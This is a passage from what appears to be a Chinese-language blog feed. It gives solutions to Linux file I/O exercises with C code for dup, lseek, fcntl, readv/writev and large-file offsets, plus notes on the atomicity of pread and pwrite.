fail\n&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="type">int</span> fd1dup = dup(fd1);</span><br><span class="line">    <span class="type">bool</span> check1 = check(fd1, fd1dup); <span class="comment">//true</span></span><br><span class="line">    <span class="type">bool</span> check2 = check(fd1, fd2); <span class="comment">// false</span></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;check1 == %s, check2 == %s\n&quot;</span>, bool2str(check1), bool2str(check2));</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> check1 + check2 - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> fd1, <span class="type">int</span> fd2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(lseek(fd1, <span class="number">0</span>, SEEK_CUR) != lseek(fd2, <span class="number">0</span>, SEEK_CUR)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        lseek(fd1, <span class="number">1</span>, SEEK_CUR);</span><br><span class="line">        <span class="keyword">if</span>(lseek(fd1, <span class="number">0</span>, SEEK_CUR) != lseek(fd2, <span class="number">0</span>, SEEK_CUR)) &#123;</span><br><span class="line">            lseek(fd1, <span class="number">-1</span>, SEEK_CUR);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        lseek(fd1, <span class="number">-1</span>, SEEK_CUR);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(fcntl(fd1, F_GETFL) != fcntl(fd2, F_GETFL)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">int</span> flag = fcntl(fd1, F_GETFL);</span><br><span class="line">        fcntl(fd1, F_SETFL, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(fcntl(fd1, F_GETFL) != fcntl(fd2, F_GETFL)) &#123;</span><br><span class="line">            fcntl(fd1, F_SETFL, flag);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fcntl(fd1, F_SETFL, flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exitErr</span><span class="params">(<span class="type">int</span> exitCode, <span class="type">const</span> <span class="type">char</span> *format, ...)</span> &#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line">    va_list va;</span><br><span class="line">    va_start(va, format);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, format, va);</span><br><span class="line">    va_end(va);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="built_in">exit</span>(exitCode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="练习6"><a href="#练习6" class="headerlink" title="练习6"></a>练习6</h2><blockquote><p>说明下列代码中每次执行 write()后，输出文件的内容是什么，为什么。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fd1 = open(file, O_RDNR | O_CREAT | O_TRUNC，S_IRUSR | S_IMUSR);</span><br><span class="line">fd2 = dup(fd1);</span><br><span class="line">fd3 = open(file，O_RDWR);</span><br><span class="line">write(fd1,<span class="string">&quot;Hello,&quot;</span>，<span class="number">6</span>); <span class="comment">// Hello</span></span><br><span class="line">write(fd2,<span class="string">&quot;world&quot;</span>, <span class="number">6</span>); <span class="comment">// Helloworld fd2由fd1复制而来，共享文件指针，fd1write后，文件指针后移，fd2也后移</span></span><br><span class="line">lseek(fd2, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">write(fd1,<span class="string">&quot;HELLO,&quot;</span>，<span class="number">6</span>); <span class="comment">// HELLOworld fd2移动到文件开头，fd1也移动，共享文件指针和</span></span><br><span class="line">write(fd3,<span class="string">&quot;Gidday&quot;</span>， <span class="number">6</span>); <span class="comment">// Giddayworld，fd3不是dup*而来，不共享指针，其指针还在0，写入0</span></span><br></pre></td></tr></table></figure><h2 id="练习7"><a href="#练习7" class="headerlink" title="练习7"></a>练习7</h2><blockquote><p>使用read()、write()以及 malloc函数包（见7.1.2节）中的必要函数以实现readv()和 writev()功能。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/uio.h&gt;</span> <span class="comment">//iovec</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true <span class="string">&#x27;\1&#x27;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false <span class="string">&#x27;\0&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> debug</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> __writev(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcount);</span><br><span class="line"><span class="type">ssize_t</span> __readv(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcount);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fdw = open(argv[<span class="number">1</span>], O_CREAT | O_TRUNC | O_RDWR);</span><br><span class="line">    <span class="type">int</span> fdr = open(argv[<span class="number">1</span>], O_CREAT | O_TRUNC | O_RDWR);</span><br><span class="line">    <span class="type">int</span> contentCount = argc - <span class="number">2</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">vecArr</span> =</span> (<span class="keyword">struct</span> iovec*)<span class="built_in">malloc</span>(<span class="number">2</span> * contentCount * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> iovec));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        vecArr[<span class="number">2</span>*(i<span class="number">-2</span>)].iov_base = argv[i];</span><br><span class="line">        vecArr[<span class="number">2</span>*(i<span class="number">-2</span>)].iov_len = <span class="built_in">strlen</span>(argv[i]);</span><br><span class="line">        vecArr[<span class="number">2</span>*(i<span class="number">-2</span>)+<span class="number">1</span>].iov_base = <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        vecArr[<span class="number">2</span>*(i<span class="number">-2</span>)+<span class="number">1</span>].iov_len = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    writev(fdw, vecArr, <span class="number">2</span> * contentCount);</span><br><span class="line">    <span class="built_in">free</span>(vecArr);</span><br><span class="line">    vecArr = (<span class="keyword">struct</span> iovec*)<span class="built_in">malloc</span>(contentCount * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> iovec));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        <span class="type">int</span> size = <span class="built_in">strlen</span>(argv[i])+<span class="number">1</span>;</span><br><span class="line">        vecArr[i<span class="number">-2</span>].iov_base = <span class="built_in">malloc</span>(size * <span class="keyword">sizeof</span>(<span class="type">char</span>) + <span class="number">1</span>);</span><br><span class="line">        vecArr[i<span class="number">-2</span>].iov_len = size;</span><br><span class="line">    &#125;</span><br><span class="line">    errno=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> read = readv(fdr, vecArr,  contentCount);</span><br><span class="line">    <span class="keyword">if</span>(read == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *err = strerror(errno);</span><br><span class="line">        write(STDOUT_FILENO, err, <span class="built_in">strlen</span>(err));</span><br><span class="line">        write(STDOUT_FILENO, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> read;</span><br><span class="line">    &#125;</span><br><span class="line">    writev(STDOUT_FILENO, vecArr, contentCount);</span><br><span class="line">    close(fdw);</span><br><span class="line">    close(fdr);</span><br><span class="line">    <span class="built_in">free</span>(vecArr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> __writev(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcount) &#123;</span><br><span class="line">    <span class="type">ssize_t</span> writeSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; iovcount; i++) &#123;</span><br><span class="line">        <span class="type">ssize_t</span> writeSize1 = write(fd, iov[i].iov_base, iov[i].iov_len);</span><br><span class="line">        writeSize += writeSize1;</span><br><span class="line">        <span class="keyword">if</span>(writeSize1 == <span class="number">-1</span> || writeSize1 &lt; iov[i].iov_len) &#123;</span><br><span class="line">            <span class="keyword">return</span> writeSize1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iovcount;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> __readv(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcount) &#123;</span><br><span class="line">    <span class="type">ssize_t</span> readSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; iovcount; i++) &#123;</span><br><span class="line">        <span class="type">ssize_t</span> readSize1 = read(fd, iov[i].iov_base, iov[i].iov_len);</span><br><span class="line">        readSize += readSize1;</span><br><span class="line">        <span class="keyword">if</span>(readSize1 == <span class="number">-1</span> || readSize1 &lt; iov[i].iov_len) &#123;</span><br><span class="line">            <span class="keyword">return</span> readSize;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(readSize == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iovcount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>学习的<code>read</code>，<code>write</code>，<code>readv</code>，<code>writev</code>，<code>preadv</code>，<code>pwritev</code>，其输入输出的内容不必都是字符串，由<code>iovec</code>的定义以及他们的函数原型可见，写入读取数据的类型为<code>void *</code>或<code>const void *</code>，是不限制输入输出的数据类型的。</p><p>此外，<code>pread*</code>和<code>pwrite*</code>具有原子性，可以代替<code>lseek + write/read</code>的组合，防止多个进程相互读写同一文件时，出现读写位置出错的情况，如果常出现<code>lseek + write/read</code>的组合，使用<code>pread*</code>和<code>pwrite*</code>可以大量减少系统调用的使用，提高性能</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;练习1&quot;&gt;&lt;a href=&quot;#练习1&quot; class=&quot;headerlink&quot; title=&quot;练习1&quot;&gt;&lt;/a&gt;练习1&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;请使用标准文件IO系统调用(open()和lseek())和off_t数据类型修改程序清单5-3中的程序。将宏_FILE_OFFSET_BITS的值设置为64进行编译，并测试该程序是否能够成功创建一个大文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;将xxx64改为xxx，off64_t改为off_t，可以创建大文件（使用 -m32编译）&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// #define _LARGEFILE64_SOURCE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; _FILE_OFFSET_BITS 64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;errno.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;define&lt;/span&gt; debug&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;ifdef&lt;/span&gt; debug&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;writeErr&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;char&lt;/span&gt;* str)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;ifdef&lt;/span&gt; _LARGEFILE64_SOURCE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;type&quot;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;ifdef&lt;/span&gt; debug&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;sizeof(long) = %d, sizeof(long long) = %d, sizeof(off_t) = %d, sizeof(off64_t) = %d\n&amp;quot;&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;sizeof&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;long&lt;/span&gt;), &lt;span class=&quot;built_in&quot;&gt;sizeof&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;long&lt;/span&gt;), &lt;span class=&quot;built_in&quot;&gt;sizeof&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;off_t&lt;/span&gt;), &lt;span class=&quot;built_in&quot;&gt;sizeof&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;off64_t&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(argc !=&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt; || &lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;], &lt;span class=&quot;string&quot;&gt;&amp;quot;--help&amp;quot;&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;writeErr&lt;/span&gt;(argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;writeErr&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot; pathname offset\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; fd = &lt;span class=&quot;built_in&quot;&gt;open64&lt;/span&gt;(argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;], O_RDWR | O_CREAT, S_IRUSR|S_IWUSR);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(fd == &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;writeErr&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&amp;quot;open64 fail&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span 